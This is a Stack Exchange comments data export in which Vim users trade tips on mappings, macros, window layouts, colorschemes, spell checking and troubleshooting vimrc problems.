  <row Id="1103" PostId="847" Score="0" Text="@AndrewFerrier Yeah, I can't get it to work with your mapping either :-/ ... Perhaps a better solution for this problem is to use the `VimEnter` autocmd or some such? ... I don't have time to investigate right now, if no one else comes up with an answer this evening, I'll look into it (I'll leave this answer to be for the time), because this seems like a sort if thing  I would want to have/use as well :-)" CreationDate="2015-02-16T13:39:32.373" UserId="51" />
  <row Id="1104" PostId="847" Score="0" Text="no worries, no rush. It's just a curiosity for me right now. Thanks for your pointers so far." CreationDate="2015-02-16T13:40:11.253" UserId="91" />
  <row Id="1105" PostId="848" Score="9" Text="Why use Vim, and not text based web browser? Such as `lynx`, `links`, `elinks`, or `w3m`? Vim is a text editor, not a web browser ... you can do this from within Vim even, with `:!lynx %`" CreationDate="2015-02-16T14:07:35.720" UserId="51" />
  <row Id="1106" PostId="848" Score="3" Text="There are some external tools for converting HTML to Markdown. [This vimcasts episode](http://vimcasts.org/episodes/using-external-filter-commands-to-reformat-html/) shows how to use pandoc, which may suit your needs." CreationDate="2015-02-16T14:08:54.340" UserId="64" />
  <row Id="1107" PostId="812" Score="0" Text="@HAL9001 Your example doesn't work (at least on OSX, doesn't paste anything). However on shell returns sometimes like: `444204315-1248057303-74280604`." CreationDate="2015-02-16T14:09:51.163" UserId="467" />
  <row Id="1108" PostId="812" Score="0" Text="@Carpetsmoker Example `:echo system(...` is just printing on the screen, can you modify the example to paste into the editor?" CreationDate="2015-02-16T14:12:19.777" UserId="467" />
  <row Id="1109" PostId="456" Score="4" Text="I would suggest defining a command instead of a function: `command! Cleanup %s/\s\+$//e`. That way, you can invoke it with `:Cleanup` instead of using the tedious function call syntax." CreationDate="2015-02-16T14:16:05.090" UserId="64" />
  <row Id="1111" PostId="851" Score="1" Text="It's available since vim 7.4." CreationDate="2015-02-16T15:31:34.617" UserId="467" />
  <row Id="1112" PostId="852" Score="1" Text="These are all useful tips, but I don't see how they answer the question?" CreationDate="2015-02-16T15:35:27.753" UserId="51" />
  <row Id="1113" PostId="308" Score="0" Text="You should take a look at the so called [approximate string matching algorithms](https://en.wikipedia.org/wiki/Approximate_string_matching), they are more appropriate tools to implement a fuzzy finder than regexps." CreationDate="2015-02-16T16:38:03.727" UserId="13" />
  <row Id="1114" PostId="852" Score="0" Text="@Carpetsmoker I could say the same about your own answer.  I told him it wasn't possible and offered a change of workflow as a possible work around.  Just like you did." CreationDate="2015-02-16T17:16:42.160" UserId="93" />
  <row Id="1115" PostId="812" Score="1" Text="@kenorb This will correctly use the shell for inputting 3 signed random integers: `:r! hexdump -n $((3*4)) -e '&quot;\%d\n&quot;' /dev/urandom`" CreationDate="2015-02-16T17:49:27.200" UserId="44" />
  <row Id="1116" PostId="862" Score="0" Text="[SU question](http://superuser.com/a/457974/334516), also with workarounds like this one." CreationDate="2015-02-16T20:09:37.153" UserId="205" />
  <row Id="1118" PostId="863" Score="0" Text="heh, you beat me to it while I was getting a beer :-)" CreationDate="2015-02-16T20:18:21.503" UserId="51" />
  <row Id="1119" PostId="865" Score="1" Text="This is a rather twisted way to go about, though." CreationDate="2015-02-16T20:41:17.607" UserId="205" />
  <row Id="1120" PostId="812" Score="0" Text="@HAL9001 I think using `%u` as a format would be better, since that's unsigned? This should remove negative numbers &amp; the associated `-` character ... Also, why not just type `12` insyead of `$((3*4))`? That way it will work in *all* shells..." CreationDate="2015-02-16T20:58:21.480" UserId="51" />
  <row Id="1121" PostId="838" Score="0" Text="Not sure what is confusing about this question. Seems pretty obvious what the OP wants." CreationDate="2015-02-16T22:11:07.127" UserId="383" />
  <row Id="1125" PostId="750" Score="0" Text="Right. You can make it work with `aq` as well with an additional similar mapping. I edited the answer. I also swapped T` with t' in the mapping so that it searches forward first, which seems more natural to me." CreationDate="2015-02-16T23:21:45.310" UserId="195" />
  <row Id="1126" PostId="750" Score="0" Text="This works for single quotes, but `daq` on `\`\`foo''` just results in `\`foo'`." CreationDate="2015-02-16T23:57:11.343" UserId="88" />
  <row Id="1127" PostId="51" Score="0" Text="How usable is it right now? Anyone tried it with FinalTerm?" CreationDate="2015-02-17T00:28:52.280" UserId="205" />
  <row Id="1128" PostId="812" Score="0" Text="@Carpetsmoker The multiplication is to emphasize that the numbers come in 4 byte packages, and yes, depending on the context `%u` may be better suited." CreationDate="2015-02-17T00:49:38.690" UserId="44" />
  <row Id="1129" PostId="750" Score="0" Text="I don't think this method can work for more than single quotes. You would need to do deeper inspection of the text than the `f` and `t` operators allow, which would require writing a whole function with variables and everything. I don't have time to do so right now." CreationDate="2015-02-17T01:49:55.397" UserId="195" />
  <row Id="1130" PostId="51" Score="0" Text="@muru it's very much usable, not too sure about using with FinalTerm though, give it a shot." CreationDate="2015-02-17T02:57:09.867" UserId="74" />
  <row Id="1131" PostId="838" Score="1" Text="What about spaces in the middle of the line? For example how do you want to deal with a line like `^Iint a; ^I ; int b;` (`^I`s are tabs)? The spaces around the second tab should be removed?" CreationDate="2015-02-17T08:55:26.577" UserId="13" />
  <row Id="1132" PostId="13" Score="0" Text="BTW, thank you very much the correct answers - if anybody would convert them to answer, I were happy to accept that." CreationDate="2015-02-17T09:15:35.060" UserId="28" />
  <row Id="1133" PostId="839" Score="1" Text="Similar question here: http://vim.1045645.n5.nabble.com/Reformat-multi-line-strings-along-with-string-delimiters-tt1190448.html#none" CreationDate="2015-02-17T10:30:22.523" UserId="91" />
  <row Id="1134" PostId="838" Score="1" Text="Downvoted because even with the edit, it's still pretty unclear what whitespace should or shouldn't be removed. Is the example the *only* type of space that is to be removed? If so, why does the first para say &quot;before tab and after tab&quot; characters, and why use the confusing term &quot;white spaces&quot; if the question is only referring to space characters?" CreationDate="2015-02-17T14:14:28.450" UserId="343" />
  <row Id="1135" PostId="870" Score="0" Text="`infercase` could also be set, I think. Ah, but it implies `ignorecase`." CreationDate="2015-02-17T14:20:58.877" UserId="356" />
  <row Id="1136" PostId="1873" Score="3" Text="I've never noticed this behaviour in Vim on any platform ... What happens if you start gVim like: `gvim -u NONE -U NONE` (you can either use cmd.exe, or make a  shortcut)? This will prevent loading your (g)vimrc files." CreationDate="2015-02-17T17:39:01.087" UserId="51" />
  <row Id="1138" PostId="1873" Score="1" Text="Is that your *complete* vimrc file? My first suspicion would be that an autocmd in your vimrc file is removing trailing whitespace. Does the behaviour change when you start gVim without any vimrc file (see above comment)?" CreationDate="2015-02-17T18:17:07.497" UserId="51" />
  <row Id="1139" PostId="1873" Score="0" Text="The above is not my complete .vimrc, there are other settings too. Running gVim without a .vimrc (:scriptnames shows no .vimrc or .gvimrc) solves my problem. You're absolutely right, I need to look through my .vimrc or something else that is sourced that might be causing this." CreationDate="2015-02-17T18:28:03.200" UserId="231" />
  <row Id="1140" PostId="1873" Score="0" Text="Apparently this elimination of whitespace-on-new-lines is a desirable behavior, I'm reading [here](http://stackoverflow.com/questions/24766031/vim-inserting-new-line-then-pressing-escape-moves-cursor-to-beginning-of-line) it's meant to keep the file clean of whitespace." CreationDate="2015-02-17T18:42:10.210" UserId="231" />
  <row Id="1141" PostId="1873" Score="0" Text="That's about opening new lines ... Not about writing to a file?" CreationDate="2015-02-17T19:05:19.627" UserId="51" />
  <row Id="1142" PostId="1873" Score="0" Text="@Carpetsmoker - True, however I was having my 'issue' here upon using the key sequence -esc-:w. I was thinking the _write action itself_ was at fault for moving the cursor to the far left. It turns out Vim's default behavior for handling unedited new lines is to move the cursor to the far left, when pressing -esc- to revert to normal mode from insert mode. So, it was really just the -esc- key press which was moving the cursor to the left. The write action was not at fault." CreationDate="2015-02-17T20:52:08.253" UserId="231" />
  <row Id="1143" PostId="1878" Score="0" Text="This is a definitive answer to my question from the original documentation. Thanks for the summary and narrative - I would not have thought to look into :h autoindent for this information. Thanks also @Carpetsmoker for discussion leading to a solution." CreationDate="2015-02-17T21:07:09.640" UserId="231" />
  <row Id="1145" PostId="1886" Score="0" Text="`realpath` isn't POSIX, so it might be simpler to do: `!echo &quot;$PWD/%&quot;`" CreationDate="2015-02-18T00:57:32.920" UserId="205" />
  <row Id="1146" PostId="1886" Score="0" Text="Agreed; good call." CreationDate="2015-02-18T01:07:27.817" UserId="520" />
  <row Id="1147" PostId="1884" Score="0" Text="I know that I can do this, but there are a couple of downsides. (1) If the window is the only view of a given buffer, and the buffer is dirty, you'll have to `:wq` or `:q!`, neither of which is desirable. (2) This will reset any window-specific settings, like the cursor position. (3) This will break any in-progress diffs. Essentially, windows are first-class citizens; destroying them and creating new ones simply isn't sufficient." CreationDate="2015-02-18T01:42:20.040" UserId="142" />
  <row Id="1148" PostId="1888" Score="0" Text="Actually, that's not a macro so much as it is a one liner, but you could map it to a key combination." CreationDate="2015-02-18T02:48:14.083" UserId="227" />
  <row Id="1149" PostId="1889" Score="2" Text="which vim (and patch level) are you using? (like vim --version output), and what OS? Regardless, it would be a good idea to update vim. If you're on a Mac and you use ruby plugins (like command-T), you might reinstall them and/or make sure vim is using system ruby and not rvm ruby (which seems to have caused troubles for some people)" CreationDate="2015-02-18T05:20:23.237" UserId="130" />
  <row Id="1150" PostId="1888" Score="0" Text="Added an operator version to do it. Operates a bit better." CreationDate="2015-02-18T05:52:25.683" UserId="227" />
  <row Id="1151" PostId="1891" Score="1" Text="If elflord sets `bg` to `dark`, why does its appearance change if I set it to `light` and back again? Note that my vimrc does not do `set bg=light`." CreationDate="2015-02-18T08:23:25.830" UserId="205" />
  <row Id="1152" PostId="1880" Score="0" Text="Karl, excellent, thank you! This also handles the input of the name a little more elegantly too, which is great, and it all seems to work, including the calling of the mapping." CreationDate="2015-02-18T08:31:30.157" UserId="91" />
  <row Id="1153" PostId="1880" Score="0" Text="No problem, I'm happy it works." CreationDate="2015-02-18T08:43:58.133" UserId="21" />
  <row Id="1154" PostId="1882" Score="0" Text="To me it seems that `:set iskeyword+={,},,,(,),^` works as expected." CreationDate="2015-02-18T08:54:06.517" UserId="21" />
  <row Id="1155" PostId="1891" Score="0" Text="`set bg` changes the colors and attributes of some highlight groups so that they work better on dark or light background. It is mostly arbitrary and may or may not have an effect depending on the colorscheme you use. Messing with that option is not a good idea." CreationDate="2015-02-18T09:20:47.023" UserId="54" />
  <row Id="1156" PostId="1891" Score="0" Text="I followed your advice on `bg` and `t_Co`. I'm just wondering why elflord's `set bg=dark` and mine cause such differing (yet repeatable) results?" CreationDate="2015-02-18T09:24:30.450" UserId="205" />
  <row Id="1157" PostId="1891" Score="1" Text="It's the order in which they are applied. Because one is not the exact opposite of the other switching multiple times between &quot;dark&quot; and &quot;light&quot; is not a toggle between two definite and stable states." CreationDate="2015-02-18T09:33:11.340" UserId="54" />
  <row Id="1158" PostId="1889" Score="1" Text="You can start vim as `vim -u NONE -p first.txt second.txt` ... This will prevent loading your vimrc file." CreationDate="2015-02-18T10:47:22.803" UserId="51" />
  <row Id="1159" PostId="1874" Score="1" Text="I'm a bit unclear as to what you're trying to achieve when you press &lt;C-W&gt;J, which moves &quot;the current window to be at the very bottom, using the full width of the screen,&quot; This means the windows will no longer be in a grid formation, by definition. What are you trying to actually do with your windows?" CreationDate="2015-02-18T11:26:59.127" UserId="343" />
  <row Id="1161" PostId="1893" Score="0" Text="It's unnecessary to clear out the `q` register, as `qq` does just that before it starts recording keystrokes. In fact, that's precisely why `qqq` works to clear the `q` register :)" CreationDate="2015-02-18T12:13:10.653" UserId="64" />
  <row Id="1163" PostId="1893" Score="0" Text="Of course, if you were doing something that required *appending* to the `q` register (i.e. using `qQ`) then clearing it first would probably be necessary." CreationDate="2015-02-18T12:15:20.827" UserId="64" />
  <row Id="1165" PostId="1888" Score="0" Text="I think it's okay if your answer doesn't specifically use a macro; the asker presented [an XY problem](http://xyproblem.info/), in my opinion." CreationDate="2015-02-18T12:18:10.827" UserId="64" />
  <row Id="1166" PostId="1893" Score="2" Text="@tommcdo That's definitely not true in my copy of Vim. (Vim 7.3.87, invoked with `vim -u NONE`). The existing contents are only cleared out when you *save* the register, in step 6. Clearing out the register before you start is therefore necessary if you want to recurse." CreationDate="2015-02-18T12:19:38.957" UserId="343" />
  <row Id="1167" PostId="1893" Score="0" Text="@tommcdo I've updated the answer to make it more clear why this step is necessary." CreationDate="2015-02-18T12:22:28.807" UserId="343" />
  <row Id="1168" PostId="1889" Score="0" Text="@hatter The vim was installed or compiled? Can you upgrade it to 7.4 and see if that helps." CreationDate="2015-02-18T13:04:31.633" UserId="467" />
  <row Id="1169" PostId="1889" Score="0" Text="@kenorb Vim was installed." CreationDate="2015-02-18T14:49:55.823" UserId="534" />
  <row Id="1170" PostId="1889" Score="0" Text="@Carpetsmoker It worked!! Does this definitively point that there is a problem in `.vimrc` file?" CreationDate="2015-02-18T14:50:58.770" UserId="534" />
  <row Id="1171" PostId="1889" Score="0" Text="@hatter It would seem so; perhaps this problem is only triggered if a certain section is enabled, or perhaps a certain plugin ... you could try to comment out lines (or blocks of lines), see if the problem still occurs, and repeat until it doesn't ... That way you can find out where the problem is..." CreationDate="2015-02-18T15:04:22.300" UserId="51" />
  <row Id="1172" PostId="1898" Score="0" Text="Thanks, but you've to check the command history every time manually, but I'm looking for some method of displaying them on the screen automatically." CreationDate="2015-02-18T15:26:53.133" UserId="467" />
  <row Id="1174" PostId="1894" Score="0" Text="Related: [Showing command history with showcmd](http://vi.stackexchange.com/questions/742/showing-command-history-with-showcmd), but I wouldn't like to modify the vim sources." CreationDate="2015-02-18T15:32:58.907" UserId="467" />
  <row Id="1176" PostId="1894" Score="1" Text="This is just the same question? There is one answer, which states that it's not possible without editing the source; perhaps more answers are possible (doubt it)" CreationDate="2015-02-18T15:34:00.707" UserId="51" />
  <row Id="1177" PostId="1894" Score="0" Text="I've tried to use `:set showcmd`, but it doesn't show keystrokes like `w`, `b`, `j`, etc." CreationDate="2015-02-18T15:36:02.360" UserId="467" />
  <row Id="1178" PostId="1894" Score="1" Text="Related: [Vim plugin that explains commands as you type them](https://softwarerecs.stackexchange.com/questions/7326/vim-plugin-that-explains-commands-as-you-type-them) at softwarerecs SE" CreationDate="2015-02-18T15:37:01.543" UserId="467" />
  <row Id="1179" PostId="742" Score="0" Text="Related: [Vim plugin that explains commands as you type them](https://softwarerecs.stackexchange.com/questions/7326/vim-plugin-that-explains-commands-as-you-type-them) at softwarerecs SE" CreationDate="2015-02-18T15:39:20.507" UserId="467" />
  <row Id="1180" PostId="1889" Score="0" Text="@Carpetsmoker please see the edited question." CreationDate="2015-02-18T15:41:38.097" UserId="534" />
  <row Id="1181" PostId="1894" Score="0" Text="It looks like the same question as [Showing command history with showcmd](http://vi.stackexchange.com/questions/742/showing-command-history-with-showcmd), the title wasn't so obvious, however editing vim sources doesn't look like a good idea." CreationDate="2015-02-18T15:43:52.323" UserId="467" />
  <row Id="1182" PostId="1894" Score="0" Text="No, but (what you consider to be) a bad answer is not a reason to ask the same question again just a few days later :-) Maybe if the other question was a 5-year old outdated question, but that's obviously not the case..." CreationDate="2015-02-18T15:49:08.983" UserId="51" />
  <row Id="1183" PostId="1894" Score="0" Text="@Carpetsmoker Most of the original questions usually have very low quality question titles, so it's almost impossible to find the right answer which you're looking for. I hope this duplicate will find locating the right question." CreationDate="2015-02-18T15:50:59.257" UserId="467" />
  <row Id="1185" PostId="1884" Score="0" Text="@WChargin Some of that goes away if you set vim to allow hidden buffers. But yeah..." CreationDate="2015-02-18T16:54:20.020" UserId="31" />
  <row Id="1186" PostId="1896" Score="1" Text="`set columns=90` will resize a gvim, but unfortunately that's the total width, not the width of the displayed text. So you'd have to use 84+ with numbers on." CreationDate="2015-02-18T17:03:36.513" UserId="31" />
  <row Id="1187" PostId="1874" Score="3" Text="@Rich I think OP is just exemplifying a situation after which he may want to reset the windows to grid formation." CreationDate="2015-02-18T18:12:14.483" UserId="356" />
  <row Id="1188" PostId="1874" Score="0" Text="@GonçaloRibeiro Correct." CreationDate="2015-02-18T18:16:29.803" UserId="142" />
  <row Id="1189" PostId="1896" Score="1" Text="Are you talking about (internal) Vim-windows, or the Terminal itself, or both?" CreationDate="2015-02-18T18:18:31.423" UserId="220" />
  <row Id="1190" PostId="1904" Score="0" Text="You're not using GVim, right? In GVim I just tried this and the numbers are not selected." CreationDate="2015-02-18T20:15:32.533" UserId="356" />
  <row Id="1191" PostId="1904" Score="0" Text="nope. using vim in a virtual terminal" CreationDate="2015-02-18T20:16:33.597" UserId="496" />
  <row Id="1192" PostId="838" Score="0" Text="@stdcall: You mean spaces just after tabs (3rd line)? Or spaces in the middle of line (between `int` and `a`/`b`)?" CreationDate="2015-02-18T20:16:42.700" UserId="467" />
  <row Id="1193" PostId="838" Score="0" Text="@kenorb Yes. after tabs (line 3)" CreationDate="2015-02-18T20:17:53.817" UserId="496" />
  <row Id="1194" PostId="1904" Score="2" Text="`:set mouse=a` should solve your problem." CreationDate="2015-02-18T20:21:39.463" UserId="54" />
  <row Id="1196" PostId="1889" Score="0" Text="@hatter You should dump the core file and check the backtrace with `gdb` what exactly is happening. If no symbols are visible, then probably you need to install vim with debug symbols or re-compile it." CreationDate="2015-02-18T21:11:38.830" UserId="467" />
  <row Id="1198" PostId="1902" Score="0" Text="While this link may answer the question, it is better to include the essential parts of the answer here and provide the link for reference.  Link-only answers can become invalid if the linked page changes." CreationDate="2015-02-18T21:42:09.013" UserId="205" />
  <row Id="1199" PostId="1902" Score="0" Text="Why the downvote?" CreationDate="2015-02-18T21:51:38.327" UserId="532" />
  <row Id="1200" PostId="241" Score="0" Text="Is this question considered a duplicate if it's on another stackexchange site?  http://stackoverflow.com/q/13194428/1698426" CreationDate="2015-02-18T21:55:28.237" UserId="532" />
  <row Id="1201" PostId="1902" Score="0" Text="Not me. Probably whoever flagged it." CreationDate="2015-02-18T21:59:42.000" UserId="205" />
  <row Id="1202" PostId="1902" Score="0" Text="copy-and-paste from SO isn't much more useful than linking" CreationDate="2015-02-18T23:30:24.843" UserId="67" />
  <row Id="1203" PostId="301" Score="0" Text="I kinda like have `jk`/`kj` exit normal mode even in Dvorak; they're the &quot;c&quot; and &quot;v&quot; keys on a QWERTY keyboard, so they're easy for my left pointer and middle fingers." CreationDate="2015-02-18T23:33:58.677" UserId="67" />
  <row Id="1205" PostId="1902" Score="0" Text="I agree.  What would be the most useful thing I could do?" CreationDate="2015-02-18T23:44:21.457" UserId="532" />
  <row Id="1207" PostId="349" Score="0" Text="FWIW KeyRemap4MacBook has been renamed Karabiner: https://pqrs.org/osx/karabiner/index.html.en" CreationDate="2015-02-19T00:00:47.707" UserId="67" />
  <row Id="1208" PostId="1908" Score="0" Text="Wait a second... So I wrote this question before testing it, and it looks like the spell check ALREADY marks &quot;the the&quot; as a &quot;spelling&quot; error. Mind blown. Question still remains, though. How to add to this list?" CreationDate="2015-02-19T01:36:54.047" UserId="390" />
  <row Id="1209" PostId="1893" Score="0" Text="My mistake, I sort of jumped the gun there. Excellent clarification!" CreationDate="2015-02-19T01:41:58.697" UserId="64" />
  <row Id="1210" PostId="1908" Score="0" Text="`:help spell-BAD`" CreationDate="2015-02-19T01:51:18.463" UserId="88" />
  <row Id="1211" PostId="1884" Score="1" Text="Instead of closing the window and splitting the buffer to the desired location, split a new window where you want it to go, exchange it with the window you want to move, then close the (moved) new window." CreationDate="2015-02-19T02:02:32.970" UserId="64" />
  <row Id="1212" PostId="1888" Score="0" Text="@tommcdo Yes, you're right; it doesn't have to be an actual macro. It just needs to be some kind of automated method." CreationDate="2015-02-19T02:18:12.017" UserId="88" />
  <row Id="1213" PostId="1911" Score="0" Text="Describing the current workflow is more a comment than an answer. Though you do explain it well." CreationDate="2015-02-19T03:55:57.123" UserId="360" />
  <row Id="1214" PostId="1911" Score="0" Text="Usually yes I can buy that. However, I'd argue that in this case a change in workflow is the answer. Meh semantics I guess." CreationDate="2015-02-19T03:59:17.513" UserId="544" />
  <row Id="1215" PostId="1911" Score="0" Text="But is isn't a change in workflow. That is my current work flow. I can't imagine another workflow that would do this.&#xA;(ok full disclosure `ciw` is new to me, but not exactly game changing)" CreationDate="2015-02-19T04:01:45.750" UserId="360" />
  <row Id="1216" PostId="1883" Score="2" Text="FYI: `Ctrl+r` is for inserting registries (including the expression `=` reg). If you want to temporarily execute a one off command use `Ctrl+o`." CreationDate="2015-02-19T04:08:11.033" UserId="544" />
  <row Id="1217" PostId="1911" Score="0" Text="@Oxinabox perhaps you looking for something more on the lines of: http://www.vim.org/scripts/script.php?script_id=4929 maybe?" CreationDate="2015-02-19T04:12:36.573" UserId="544" />
  <row Id="1218" PostId="1911" Score="0" Text="Yes, that is much more like what I am looking for." CreationDate="2015-02-19T04:14:57.270" UserId="360" />
  <row Id="1219" PostId="584" Score="0" Text="Don't forget that while in the middle of editing a command you can bring up current line in the history editor and use vi to edit the line by pressing `Ctrl+f`" CreationDate="2015-02-19T04:20:25.793" UserId="544" />
  <row Id="1220" PostId="1900" Score="0" Text="There are 2 difficult problems in computer science: 1) cache invalidation, 2) naming things and 3) off by 1 errors" CreationDate="2015-02-19T05:14:39.943" UserId="19" />
  <row Id="1221" PostId="1899" Score="0" Text="I am using Vim 7.4. Official website says this is the latest version." CreationDate="2015-02-19T05:28:43.873" UserId="534" />
  <row Id="1222" PostId="255" Score="1" Text="This plugin was slow for me for some reason when zooming out. Anyone else having the same issue?" CreationDate="2015-02-19T05:42:07.273" UserId="571" />
  <row Id="1223" PostId="1899" Score="0" Text="@hatter you have fewer patches applied than are available." CreationDate="2015-02-19T05:45:08.557" UserId="31" />
  <row Id="1225" PostId="397" Score="0" Text="vim-plug definitely supports windows, I use it all the time." CreationDate="2015-02-19T06:35:20.730" UserId="578" />
  <row Id="1226" PostId="839" Score="2" Text="Have you also considered rewriting the code as a [`&quot;&quot;&quot;multi-line string&quot;&quot;&quot;`](https://docs.python.org/3/reference/lexical_analysis.html#grammar-token-longstring)?" CreationDate="2015-02-19T07:18:46.990" UserId="24" />
  <row Id="1227" PostId="1922" Score="2" Text="I don't know the answer, but I know that `:substitute` operatores on a line by line basis, which explains what you are seeing in your example." CreationDate="2015-02-19T08:03:12.563" UserId="21" />
  <row Id="1229" PostId="1918" Score="4" Text="Alternatively, you can use `dap` to delete a paragraph, `da(`, `da{`, `da[`, to delete blocks delimeted by parentheses, braces, or square brackets. For html there is `dat`, which deletes a tag, and `da'` and `da&quot;` delete strings. There is also the `dip`, `di(`, etc variants, that will delete everything inside the delimiters, but leave the delimiters intact. Alternatively, you can use `vap` (resp `vip`) to select all (resp inner) paragraph. (And so there is `va(` and `vi(`.) Further there is `cap` and `cip` (or `ca(` and `ci(`) to delete and go to insert mode (i.e., &quot;change&quot;). And `yap` to yank" CreationDate="2015-02-19T08:12:49.350" UserId="111" />
  <row Id="1230" PostId="1916" Score="5" Text="Might as well use visual mode for this, right?" CreationDate="2015-02-19T08:14:16.827" UserId="111" />
  <row Id="1231" PostId="1929" Score="1" Text="How does this answer the question?" CreationDate="2015-02-19T08:39:48.750" UserId="205" />
  <row Id="1232" PostId="1929" Score="0" Text="It takes the output of the command and puts it into vim." CreationDate="2015-02-19T08:43:37.267" UserId="593" />
  <row Id="1233" PostId="1893" Score="0" Text="@tommcdo Well, I think the answer's better now than it was before, so I'm glad you did!" CreationDate="2015-02-19T08:45:34.110" UserId="343" />
  <row Id="1234" PostId="1925" Score="0" Text="Accepting for the `d2j` which solves the problem." CreationDate="2015-02-19T08:49:47.103" UserId="579" />
  <row Id="1235" PostId="1916" Score="3" Text="That's _one_ way, jmc, but I'm not sure _standard_ vi has a visual mode." CreationDate="2015-02-19T08:52:17.947" UserId="579" />
  <row Id="1236" PostId="1928" Score="2" Text="Can you elaborate on what is `single-normal-mode-key`? You mean Escape?" CreationDate="2015-02-19T09:10:01.983" UserId="467" />
  <row Id="1237" PostId="1928" Score="0" Text="A single key press that you would use in normal mode can be used in insert mode with the alt key.  e.g. Alt+x to delete a character." CreationDate="2015-02-19T09:21:08.293" UserId="593" />
  <row Id="1238" PostId="839" Score="1" Text="@200_success, that's a great tip, thanks. I didn't know about that feature of Python at all. It seems to work, mostly - although all parameters to the function are reflowed, which isn't ideal. I think my question is still valid for the type of string I have though, and certainly for other langs." CreationDate="2015-02-19T09:40:07.843" UserId="91" />
  <row Id="1239" PostId="1928" Score="2" Text="I don't quite understand this answer either; Alt+x actually seems to do something different than Alt in normal mode? And some other keys don't seem to work? But maybe I'm using it wrong..? Maybe you could expand on your answer a little bit to explain how it works, and link to some Vim docs would also be good :-) Thanks! :-)" CreationDate="2015-02-19T09:52:39.377" UserId="51" />
  <row Id="1240" PostId="161" Score="0" Text="I don't understand why you use a macro for single command, when you can do `:9,22 normal I#` as per my answer." CreationDate="2015-02-19T09:53:54.853" UserId="612" />
  <row Id="1241" PostId="1935" Score="0" Text="Thanks for your answer! Could you perhaps expand it? Providing plugin-answers is fine, but right now it's just s a link to a plugin. At the very least, a basic description of what it does and how to use it is expected in the answer. [also see this meta post](http://meta.vi.stackexchange.com/a/102/51)." CreationDate="2015-02-19T10:09:40.390" UserId="51" />
  <row Id="1242" PostId="146" Score="0" Text="0 is not needed since by default, `normal` command is executed with cursor at start of the line." CreationDate="2015-02-19T10:28:12.263" UserId="534" />
  <row Id="1244" PostId="1889" Score="0" Text="@kenorb Vim doesn't write to a core file. When this problem occurs, I kill the terminal. I think this closes Vim before it can write to the core file." CreationDate="2015-02-19T10:40:15.413" UserId="534" />
  <row Id="1245" PostId="1912" Score="3" Text="Are you using the html filetype, as the question tag suggests? If so, the short answer is that Vim's included html syntax file doesn't support ejs files, and you'll need to find or write one that does. You could try [this one](https://github.com/nikvdp/ejs-syntax)." CreationDate="2015-02-19T10:48:36.773" UserId="343" />
  <row Id="1246" PostId="1889" Score="0" Text="@hatter All programs normally write to core file on SEGV, but sometimes these needs to be enabled depending on the OS. If it's Linux, [see](http://unix.stackexchange.com/q/31187/21471)." CreationDate="2015-02-19T10:50:38.437" UserId="467" />
  <row Id="1247" PostId="1941" Score="0" Text="But this means you still need to count the lines ...? Or did I misunderstand your answer?" CreationDate="2015-02-19T10:51:08.267" UserId="51" />
  <row Id="1248" PostId="1916" Score="0" Text="— I definitely agree with you that this is a viable approach in vi. But as the question only mentions vim, it seems rather strange (incomplete) not to mention visual mode in your answer." CreationDate="2015-02-19T10:55:16.580" UserId="111" />
  <row Id="1249" PostId="1941" Score="4" Text="You don't need to count the lines, but you do need to know the line numbers." CreationDate="2015-02-19T10:55:54.417" UserId="111" />
  <row Id="1250" PostId="1899" Score="0" Text="He's running Debian, so that explains that :-)" CreationDate="2015-02-19T10:57:13.467" UserId="51" />
  <row Id="1251" PostId="1947" Score="2" Text="This is also the first thing that I tried when I saw the question :-) But if you use a command that outputs to stdout (or stderr), it will &quot;clobber&quot; your main Vim window (try `:silent !ls`) ... It also doesn't give proper output on a non-0 exit code... So I'm afraid it's a bit more involved than just using `:silent`..." CreationDate="2015-02-19T11:07:08.283" UserId="51" />
  <row Id="1252" PostId="1947" Score="0" Text="Oh, sorry. Added some notes about asynchronous execution while you wrote your comment. Don't know how to address the exit status issue. You might want to try in #vim on Freenode." CreationDate="2015-02-19T11:11:35.840" UserId="628" />
  <row Id="1253" PostId="1947" Score="0" Text="I also want to note that neither `:silent exec &quot;!ls&quot;` nor `:silent !ls` show any output at all on my version of Vim, 7.4 with patches 1-213." CreationDate="2015-02-19T11:14:38.977" UserId="628" />
  <row Id="1254" PostId="1942" Score="1" Text="Would you be willing to use the +python interface, or one of the other language interfaces?" CreationDate="2015-02-19T11:17:15.967" UserId="630" />
  <row Id="1255" PostId="1942" Score="1" Text="@joeytwiddle Yes" CreationDate="2015-02-19T11:33:53.767" UserId="153" />
  <row Id="1256" PostId="1947" Score="1" Text="Hm, here's what I get after `:silent !ls`:  http://i.stack.imgur.com/1XvS6.png ... I need to press `^L` to fix it again ..." CreationDate="2015-02-19T11:35:22.573" UserId="51" />
  <row Id="1257" PostId="1947" Score="0" Text="vim-dispatch certainly looks like a solution to the given problem." CreationDate="2015-02-19T11:56:05.217" UserId="630" />
  <row Id="1258" PostId="1896" Score="0" Text="I'm talking about both. If the Vim window needs to be larger than the terminal width, I'd like the terminal to expand.  Perhaps this isn't possible within vim..." CreationDate="2015-02-19T11:57:30.503" UserId="69" />
  <row Id="1259" PostId="1874" Score="0" Text="Related: [How to change the current split's width and height?](http://vi.stackexchange.com/q/514/467), [How to convert all windows into horizontal, vertical or tab splits?](http://vi.stackexchange.com/q/758/467)" CreationDate="2015-02-19T11:58:26.133" UserId="467" />
  <row Id="1260" PostId="1914" Score="1" Text="I know this doesn't answer your question, but your choice of string formatting is usually discouraged in javascript. See http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml?showone=Multiline_string_literals#Multiline_string_literals for reference and a way to avoid this problem." CreationDate="2015-02-19T12:28:28.473" UserId="642" />
  <row Id="1261" PostId="1957" Score="0" Text="This seems to be the same as [Khelben's answer of Feb 8](http://vi.stackexchange.com/a/612/51)?" CreationDate="2015-02-19T12:29:36.940" UserId="51" />
  <row Id="1262" PostId="770" Score="0" Text="Doesn't work. I added it to my .bashrc and I don't get it in my clipboard. I'm using Ubuntu 14.04" CreationDate="2015-02-19T12:55:01.720" UserId="496" />
  <row Id="1263" PostId="1950" Score="0" Text="This happens only on my system. Doesn't happen with `-u NONE`. Seems the line `set columns=1000` in `.vimrc` is the culprit." CreationDate="2015-02-19T13:22:52.950" UserId="534" />
  <row Id="1265" PostId="1960" Score="1" Text="This question is very unclear. What is a &quot;syntax highlighting library&quot;? Do you have a specific library you want to use? And how do you want to &quot;integrate&quot; with it (ie. what do you wnat it to do)? As far as I know, `ctags` has nothing to do with syntax highlighting..." CreationDate="2015-02-19T14:01:12.613" UserId="51" />
